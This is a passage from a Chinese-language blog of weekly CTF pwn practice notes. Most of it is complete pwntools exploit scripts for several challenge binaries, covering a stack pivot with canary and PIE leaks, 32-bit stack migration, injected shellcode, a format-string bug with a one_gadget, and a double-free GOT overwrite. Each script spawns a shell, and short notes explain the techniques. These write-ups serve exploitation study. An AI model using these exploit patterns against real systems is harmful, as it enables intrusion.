p.recv()</span><br><span class="line">    getshell()</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    bin_elf = &quot;./pwn&quot;</span><br><span class="line">    elf = ELF(bin_elf)</span><br><span class="line">    context.binary=bin_elf</span><br><span class="line">    context.log_level = &quot;debug&quot;</span><br><span class="line">    if sys.argv[1] == &quot;r&quot;:</span><br><span class="line">        p = remote(&quot;172.29.3.117&quot;,9999)</span><br><span class="line">        libc = elf.libc</span><br><span class="line">    elif sys.argv[1] == &quot;l&quot;:</span><br><span class="line">        libc = elf.libc</span><br><span class="line">        p = process(bin_elf)</span><br><span class="line">    exp1()</span><br></pre></td></tr></table></figure>

<p>这个比之前做的 tcache 简单一些，很简单的 UAF 。但是我分析这个堆的时候很迷，怎么 bss 段的跑到堆上了，是我忘了点啥吗，很奇怪。</p>
<h2 id="pwn7"><a href="#pwn7" class="headerlink" title="pwn7"></a>pwn7</h2><blockquote>
<p>栈迁移</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">#encoding:utf-8</span><br><span class="line">#!/upr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">def piedebug(addr):</span><br><span class="line">    text_base = int(os.popen(&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;.format(p.pid)).readlines()[1],16)</span><br><span class="line">    log.info(&quot;elf_base:&#123;&#125;&quot;.format(hex(text_base)))</span><br><span class="line">    log.info(&quot;fake_heap:&#123;&#125;&quot;.format(hex(text_base + 0x202018)))</span><br><span class="line">    #log.info(&quot;get_array:&#123;&#125;&quot;.format(hex(text_base + 0x202140)))</span><br><span class="line">    if addr!=0:</span><br><span class="line">        gdb.attach(p,&#x27;b *&#123;&#125;&#x27;.format(hex(text_base+addr)))</span><br><span class="line">    else:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">#-------------------------------------</span><br><span class="line">def sl(s):</span><br><span class="line">    return p.sendline(s)</span><br><span class="line">def sd(s):</span><br><span class="line">    return p.send(s)</span><br><span class="line">def rc(timeout=0):</span><br><span class="line">    if timeout == 0:</span><br><span class="line">        return p.recv()</span><br><span class="line">    else:</span><br><span class="line">        return p.recv(timeout=timeout)</span><br><span class="line">def ru(s, timeout=0):</span><br><span class="line">    if timeout == 0:</span><br><span class="line">        return p.recvuntil(s)</span><br><span class="line">    else:</span><br><span class="line">        return p.recvuntil(s, timeout=timeout)</span><br><span class="line">def sla(p,a,s):</span><br><span class="line">    return p.sendlineafter(a,s)</span><br><span class="line">def sda(a,s):</span><br><span class="line">    return p.sendafter(a,s)</span><br><span class="line">def debug(addr=&#x27;&#x27;):</span><br><span class="line">    gdb.attach(p,addr)</span><br><span class="line">    pause()</span><br><span class="line">def getshell():</span><br><span class="line">    p.interactive()</span><br><span class="line">def msg(msg,addr):</span><br><span class="line">    log.warn(msg+&quot;-&gt;&quot;+hex(addr))</span><br><span class="line">#-------------------------------------</span><br><span class="line">def exp():</span><br><span class="line">    name =&quot;admin&quot;</span><br><span class="line">    new = &quot;&quot;</span><br><span class="line">    for i in range(len(name)):</span><br><span class="line">        new+=chr(ord(name[i])^i)</span><br><span class="line"></span><br><span class="line">    piedebug(0x0118A)</span><br><span class="line">    ru(&quot;please input your name\n&quot;)</span><br><span class="line">    sl(new)</span><br><span class="line">    ru(&quot;do you want to get something???\n&quot;)</span><br><span class="line"></span><br><span class="line">    sd(&quot;a&quot;*0x19)</span><br><span class="line">    ru(&quot;a&quot;*0x18)</span><br><span class="line">    canary = u64(p.recv(8))-0x61</span><br><span class="line">    stack = u64(p.recv(6).ljust(8,&quot;\x00&quot;))-0x28</span><br><span class="line">    msg(&quot;canary&quot;,canary)</span><br><span class="line">    msg(&quot;stack&quot;,stack)</span><br><span class="line">    ru(&quot;OK???\n&quot;)</span><br><span class="line">    sd(&quot;b&quot;*0x18+p64(canary))</span><br><span class="line"></span><br><span class="line">    ru(&quot;I think you can do something now\n&quot;)</span><br><span class="line">    pay = &quot;c&quot;*0x18+&quot;a&quot;*0x10+p64(canary)+&quot;a&quot;*8+&quot;\xde\x50&quot;#1/16</span><br><span class="line">    #pay = &quot;%7$p%8$p%9$p&quot;.ljust(0x18,&quot;\x00&quot;)+p64(canary)*4+&quot;\xa2\x11&quot;#1/16</span><br><span class="line">    sd(pay)</span><br><span class="line">    #print p.recv()</span><br><span class="line"></span><br><span class="line">    ru(&quot;do you want to get something???\n&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sd(&quot;a&quot;*0x21)</span><br><span class="line">    ru(&quot;OK???\n&quot;)</span><br><span class="line">    sd(&quot;b&quot;*0x29)</span><br><span class="line">    ru(&quot;a&quot;*8)</span><br><span class="line">    piebase = u64(p.recv(6).ljust(8,&quot;\x00&quot;))-0x1440</span><br><span class="line">    msg(&quot;piebase&quot;,piebase)</span><br><span class="line">    printf_got=elf.got[&quot;printf&quot;]+piebase</span><br><span class="line">    printf_plt=elf.plt[&quot;printf&quot;]+piebase</span><br><span class="line">    read_got=elf.got[&quot;read&quot;]+piebase</span><br><span class="line">    pop_rdi_ret=piebase+0x14a3</span><br><span class="line">    leave_ret=piebase+0x10dc</span><br><span class="line">    vul = piebase+0x10de</span><br><span class="line">    msg(&quot;printf_got&quot;,printf_got)</span><br><span class="line">    msg(&quot;printf_plt&quot;,printf_plt)</span><br><span class="line">    msg(&quot;read_got&quot;,read_got)</span><br><span class="line"></span><br><span class="line">    ru(&quot;I think you can do something now\n&quot;)</span><br><span class="line">    gadget = &quot;a&quot;*0x8+p64(pop_rdi_ret)+p64(read_got)+p64(printf_plt)</span><br><span class="line">    pay = gadget+p64(vul)+p64(canary)+p64(stack)+p64(leave_ret)</span><br><span class="line">    sd(pay)</span><br><span class="line">    libc.address = u64(p.recv(6).ljust(8,&quot;\x00&quot;))-libc.sym[&quot;read&quot;]</span><br><span class="line">    system = libc.sym[&quot;system&quot;]</span><br><span class="line">    msg(&quot;libc.address&quot;,libc.address)</span><br><span class="line"></span><br><span class="line">    ru(&quot;do you want to get something???\n&quot;)</span><br><span class="line">    #piedebug(0x11fe)</span><br><span class="line">    sd(&quot;a&quot;*0x8)</span><br><span class="line">    ru(&quot;OK???\n&quot;)</span><br><span class="line">    sd(&quot;b&quot;*0x8)</span><br><span class="line">    ru(&quot;I think you can do something now\n&quot;)</span><br><span class="line">    gadget = &quot;/bin/sh\x00&quot;+p64(pop_rdi_ret)+p64(stack)+p64(system)</span><br><span class="line">    pay = gadget+p64(0)+p64(canary)+p64(stack-0x10)+p64(leave_ret)</span><br><span class="line">    sd(pay)</span><br><span class="line">    getshell()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    bin_elf = &quot;./pwn&quot;</span><br><span class="line">    elf = ELF(bin_elf)</span><br><span class="line">    context.binary=bin_elf</span><br><span class="line">    context.log_level = &quot;debug&quot;</span><br><span class="line">    #context.terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">    if sys.argv[1] == &quot;r&quot;:</span><br><span class="line">        p = remote(&quot;172.29.3.118&quot;,9999)</span><br><span class="line">        libc = elf.libc</span><br><span class="line">    elif sys.argv[1] == &quot;l&quot;:</span><br><span class="line">        libc = elf.libc</span><br><span class="line">        #取消aslr保护机制</span><br><span class="line">        #p = process(bin_elf, aslr=0)</span><br><span class="line">        #加入libc进行调试：</span><br><span class="line">        #p = process(bin_elf,env = &#123;&quot;LD_PRELOAD&quot;: &quot;../libc-2.23.so.i386&quot;&#125;)</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        try:</span><br><span class="line">            p = process(bin_elf)</span><br><span class="line">            exp()</span><br><span class="line">        except:</span><br><span class="line">            p.close()</span><br></pre></td></tr></table></figure>

<p>这道题我在调试的时候遇到问题很多,在线解决.不过把师傅思路整明白了,首先通过过 printf 把 canary 带出来,之后碰运气撞出来 <code>sub_10DE</code> ,之后再来一遍,把 pie 泄漏出来,最后泄漏一个 read 函数把 libc 整出来,最后起 shell ,我在几个具体构造还不太明白,赶紧整</p>
<h2 id="lab6"><a href="#lab6" class="headerlink" title="lab6"></a>lab6</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import time</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">r = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_plt = 0x8048380</span><br><span class="line">puts_plt = 0x8048390</span><br><span class="line">leave_ret = 0x08048418</span><br><span class="line">pop_edx_ret = 0x0804836d</span><br><span class="line">puts_got = 0x8049ff0</span><br><span class="line">buf = 0x0804b000-0x200</span><br><span class="line">buf2 = buf + 0x100</span><br><span class="line">payload = &quot;a&quot;*40</span><br><span class="line">payload += flat([buf,read_plt,leave_ret,0,buf,100])</span><br><span class="line">r.recvuntil(&quot;:&quot;)</span><br><span class="line">r.send(payload)</span><br><span class="line">time.sleep(0.1)</span><br><span class="line"></span><br><span class="line">rop = flat([buf2,puts_plt,pop_edx_ret,puts_got,read_plt,leave_ret,0,buf2,100])</span><br><span class="line"></span><br><span class="line">r.sendline(rop)</span><br><span class="line">r.recvuntil(&quot;\n&quot;)</span><br><span class="line">puts_off = 0x5fca0</span><br><span class="line">libc = u32(r.recv(4)) - puts_off</span><br><span class="line">print &quot;libc:&quot;,hex(libc)</span><br><span class="line">time.sleep(0.1)</span><br><span class="line">system_off = 0x3ada0</span><br><span class="line">system = libc + system_off</span><br><span class="line">rop2 = flat([buf,system,0,buf2+4*4,&quot;/bin/sh&quot;])</span><br><span class="line">r.sendline(rop2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>堆栈迁移,上题引申出来的,发现自己完全忘记了,赶紧看了看,终于懂了,我发现我之前理解错了,或者说理解的很浅, tcl .这题关键是溢出字节太少了,需要去做一个迁移,所以就做了 2 个手脚来 read 输入.发现 32 位和 64 位比起来是真简单,和自己用 exp 写东西一样,2333,难度层面简直是弟弟</p>
<p>尴尬了,今天深入从汇编层面想了想,发现我真的理解错了,啊~~~ 简单说一下.第一次 payload 的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &quot;a&quot;*40</span><br><span class="line">payload += flat([buf,read_plt,leave_ret,0,buf,100])</span><br></pre></td></tr></table></figure>

<p>首先执行 read 函数,后边 3 个参数,之后顺序往下执行,又因为 ebp 一直指向 buf ,所以 ebp 去 buf 了, esp 指向哪呢??对,这就是我之前理解的,现在想想,我是把汇编层面的东西自己理解的有点偏差,应该是这样</p>
<p>首先的 buf 应该首先被 leave 出去,这样 ebp 就指向了 buf , esp 指向 read ,后边顺序执行,之后到了 leave 后我们的 esp 就理所应当的被迁移到了 buf 处,这才是正确的理解, orz</p>
<h2 id="pwn9"><a href="#pwn9" class="headerlink" title="pwn9"></a>pwn9</h2><blockquote>
<p>小知识点,直接写 shellcode</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">#encoding:utf-8</span><br><span class="line">#!/upr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">def sl(s):</span><br><span class="line">    return p.sendline(s)</span><br><span class="line">def sd(s):</span><br><span class="line">    return p.send(s)</span><br><span class="line">def rc(timeout=0):</span><br><span class="line">    if timeout == 0:</span><br><span class="line">        return p.recv()</span><br><span class="line">    else:</span><br><span class="line">        return p.recv(timeout=timeout)</span><br><span class="line">def ru(s, timeout=0):</span><br><span class="line">    if timeout == 0:</span><br><span class="line">        return p.recvuntil(s)</span><br><span class="line">    else:</span><br><span class="line">        return p.recvuntil(s, timeout=timeout)</span><br><span class="line">def sla(p,a,s):</span><br><span class="line">    return p.sendlineafter(a,s)</span><br><span class="line">def sda(a,s):</span><br><span class="line">    return p.sendafter(a,s)</span><br><span class="line">def debug(addr=&#x27;&#x27;):</span><br><span class="line">    gdb.attach(p,addr)</span><br><span class="line">    pause()</span><br><span class="line">def getshell():</span><br><span class="line">    p.interactive()</span><br><span class="line">def msg(msg,addr):</span><br><span class="line">    log.warn(msg+&quot;-&gt;&quot;+hex(addr))</span><br><span class="line">#-------------------------------------</span><br><span class="line">def exp():</span><br><span class="line">    jmp = 0x08048554</span><br><span class="line">    shellcode =&#x27;&#x27;&#x27;</span><br><span class="line">    xor    eax,eax</span><br><span class="line">    push   eax</span><br><span class="line">    push   0x68732f2f</span><br><span class="line">    push   0x6e69622f</span><br><span class="line">    mov    ebx,esp</span><br><span class="line">    mov    ecx,eax</span><br><span class="line">    mov    edx,eax</span><br><span class="line">    mov    al,0xb</span><br><span class="line">    int    0x80</span><br><span class="line">    xor    eax,eax</span><br><span class="line">    inc    eax</span><br><span class="line">    int    0x80</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    shellcode =asm(shellcode)</span><br><span class="line">    shell=&quot;sub esp,0x28;call esp&quot;</span><br><span class="line">    shell =asm(shell)</span><br><span class="line">    ru(&quot;&gt;\n&quot;)</span><br><span class="line">    pay = shellcode.ljust(0x24,&quot;\x00&quot;)</span><br><span class="line">    pay+= p32(jmp)</span><br><span class="line">    pay+=shell</span><br><span class="line">    #debug(&quot;b *0x8048554&quot;)</span><br><span class="line">    sl(pay)</span><br><span class="line">    getshell()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    bin_elf = &quot;./pwn&quot;</span><br><span class="line">    elf = ELF(bin_elf)</span><br><span class="line">    context.binary=bin_elf</span><br><span class="line">    #context.log_level = &quot;debug&quot;</span><br><span class="line">    #context.terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">    if sys.argv[1] == &quot;r&quot;:</span><br><span class="line">        p = remote(&quot;172.29.3.120&quot;,9999)</span><br><span class="line">        libc = elf.libc</span><br><span class="line">    elif sys.argv[1] == &quot;l&quot;:</span><br><span class="line">        libc = elf.libc</span><br><span class="line">        p = process(bin_elf)</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>这个就是最简单的往栈里写东西了,连 nx 也关了,这是什么题~~ 不过我发现 wp 和我想得不太一样,师傅先去 <code>jump esp</code> ,然后利用 <code>sub esp,0x28;call esp</code> 起的 shell ,我感觉有点头皮发麻,突然发现我之前整的直接跳到 buf 处必须关 aslr ,学到了学到了~~~~ 下面简单说一下思路:</p>
<p>构造情况<code>shellcode + jmp + shell</code> ,到 jmp 的时候 esp 在 shell ,所以直接 esp 减 0x24+4 就好了,之后就是我们希望的执行了~~~</p>
<h2 id="story"><a href="#story" class="headerlink" title="story"></a>story</h2><blockquote>
<p>来自西湖论剑</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p= process(&#x27;story&#x27;)</span><br><span class="line">#p=remote(&#x27;ctf2.linkedbyx.com&#x27;,10895)</span><br><span class="line">libc = ELF(&#x27;./libc-2.23.so&#x27;)</span><br><span class="line">p.sendline(&quot;%15$p%25$p&quot;)</span><br><span class="line">p.recvuntil(&quot;0x&quot;)</span><br><span class="line"></span><br><span class="line">canary = int(p.recvuntil(&quot;0x&quot;)[:-2],16)</span><br><span class="line">info(&quot;canary:0x%x&quot;,canary)</span><br><span class="line">addr = int(p.recvuntil(&#x27;\n&#x27;)[:-1],16)</span><br><span class="line">libc_base = addr - libc.symbols[&#x27;__libc_start_main&#x27;]-0xf0</span><br><span class="line">info(&quot;libc:0x%x&quot;,libc_base)</span><br><span class="line">one = libc_base+0xf1147</span><br><span class="line">pay = (0x808-0x780)*&#x27;\x00&#x27;+p64(canary)+p64(0)+p64(one)+&#x27;\x00&#x27;*400</span><br><span class="line">p.recvuntil(&#x27;story&#x27;)</span><br><span class="line">p.sendline(&#x27;200&#x27;)</span><br><span class="line">p.recvuntil(&#x27;story&#x27;)</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>简单的格式化字符串洞,完全忘记了,简单记录一下怎么找的偏移</p>
<p>先暴力输入一堆<code>%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.</code>然后找偏移,如果有结尾 00 的可以注意一下,然后用 cyclic 加猜测的偏移确定,我是这样的,不知道师傅们怎么确定的,知道 canary 后用 gdb 就能确定 <code>__libc_start_main+240</code> 的偏移,这就简单了.之后填入 one_gadget 完事~~~ ,对,这里记录一下 one_gadget 的骚操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">☁  xihulunjian  one_gadget libc-2.23.so </span><br><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure>

<p>这时摆出来的限制情况,我发现师傅 tql ,他根据输入精准控制栈的情况</p>
<h2 id="noinfoleak"><a href="#noinfoleak" class="headerlink" title="noinfoleak"></a>noinfoleak</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r = process(&#x27;./noinfoleak&#x27;)</span><br><span class="line">elf = ELF(&#x27;noinfoleak&#x27;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;, checksec=False)</span><br><span class="line">#gdb.attach(r, gdbscript=&#x27;b *0x00400AC7\nc\n&#x27;)</span><br><span class="line"></span><br><span class="line">def add(size, data):</span><br><span class="line">    r.sendlineafter(&#x27;&gt;&#x27;, &#x27;1&#x27;)</span><br><span class="line">    r.sendlineafter(&#x27;&gt;&#x27;, str(size))</span><br><span class="line">    r.sendlineafter(&#x27;&gt;&#x27;, data)</span><br><span class="line">def delete(index):</span><br><span class="line">    r.sendlineafter(&#x27;&gt;&#x27;, &#x27;2&#x27;)</span><br><span class="line">    r.sendlineafter(&#x27;&gt;&#x27;, str(index))</span><br><span class="line">def edit(index, data):</span><br><span class="line">    r.sendlineafter(&#x27;&gt;&#x27;, &#x27;3&#x27;)</span><br><span class="line">    r.sendlineafter(&#x27;&gt;&#x27;, str(index))</span><br><span class="line">    r.sendafter(&#x27;&gt;&#x27;, data)</span><br><span class="line"></span><br><span class="line">add(0x30, &#x27;/bin/sh&#x27;)</span><br><span class="line">add(0x20, &#x27;AAA&#x27;)</span><br><span class="line">add(0x20, &#x27;BBB&#x27;)</span><br><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line">delete(1)</span><br><span class="line">arrAddr = 0x06010A0</span><br><span class="line">freeGotAddr = elf.got[&#x27;free&#x27;]</span><br><span class="line">putsPltAddr = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">putsGotAddr = elf.got[&#x27;puts&#x27;]</span><br><span class="line">add(0x20, p64(arrAddr))</span><br><span class="line">add(0x20, &#x27;second&#x27;)</span><br><span class="line">add(0x20, &#x27;first&#x27;)</span><br><span class="line"></span><br><span class="line">add(0x20, p64(freeGotAddr))</span><br><span class="line">edit(1, p64(putsPltAddr))</span><br><span class="line"># ptr = free_got =&gt; puts_plt</span><br><span class="line"></span><br><span class="line">edit(6, p64(putsGotAddr))</span><br><span class="line">delete(1)</span><br><span class="line"># ptr = puts_got</span><br><span class="line">LeakStr = r.recvuntil(&#x27;\n&#x27;, drop=True)</span><br><span class="line">libcBaseAddr = u64(LeakStr.ljust(8, &#x27;\x00&#x27;)) - libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">systemAddr = libcBaseAddr + libc.symbols[&#x27;system&#x27;]</span><br><span class="line">print(&#x27;libc base address: 0x%x&#x27; % libcBaseAddr)</span><br><span class="line">print(&#x27;systemAdd address: 0x%x&#x27; % systemAddr)</span><br><span class="line"># overwrite arrAddr[1] to free@got</span><br><span class="line">edit(6, p64(freeGotAddr))</span><br><span class="line"># overwrite free@got to system</span><br><span class="line">edit(1, p64(systemAddr))</span><br><span class="line"># system(&quot;/bin/sh&quot;)</span><br><span class="line">delete(0)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>这个应该是最符合这题要求的最简洁的预期解了,就是简单的修改 got 表,不需要改 io_file 的结构什么的,看 dalao 的 wp 把我看蒙了,毕竟第一次接触到这种没有 leak 的题,发现还可以</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/10/11/2019-10-14-2nd_week/" data-id="cuid0Ld-RVUU9DaFySL6_Tb4-" data-title="second week" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2019/10/11/2019-10-11-1st_week/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          first week
        
      </div>
    </a>
  
  
    <a href="/2019/10/05/2019-10-05-goods/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">Some interesting exercises</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
